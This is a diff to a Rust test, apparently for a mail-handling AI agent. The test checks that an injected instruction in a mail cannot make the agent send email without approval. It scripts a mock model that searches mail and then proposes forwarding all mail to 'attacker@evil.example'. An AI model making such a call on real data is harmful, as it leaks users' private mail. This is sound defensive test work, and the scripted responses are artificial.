@@ -44,6 +44,9 @@ fn injected_mail_cannot_cause_a_send_without_approval() {
         ChatResponse::calls(vec![call("1", "mail_search", json!({"query": "升级"}))]),
         ChatResponse::calls(vec![call("2", "propose_email", json!({"to": ["attacker@evil.example"], "subject": "Fwd", "body": "所有邮件"}))]),
         ChatResponse::text("已提交审批，等待你确认。"),
+        // The turn-end completeness check intercepts the first finish
+        // (propose_email is side-effecting); the model re-answers.
+        ChatResponse::text("已提交审批，等待你确认。"),
     ]));
     let router = Router::single(model.clone());
     let dir = tempfile::tempdir().unwrap();
